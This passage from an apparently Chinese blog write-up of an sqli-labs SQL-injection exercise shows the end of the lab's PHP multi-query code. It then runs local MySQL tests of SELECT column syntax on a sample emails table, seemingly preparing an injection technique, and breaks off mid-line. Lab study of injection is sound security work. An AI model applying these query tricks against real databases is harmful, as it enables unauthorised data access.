class="keyword">while</span>(@mysqli_next_result(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地环境测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="operator">*</span> <span class="keyword">from</span> emails;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;* from emails&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span><span class="operator">|</span><span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line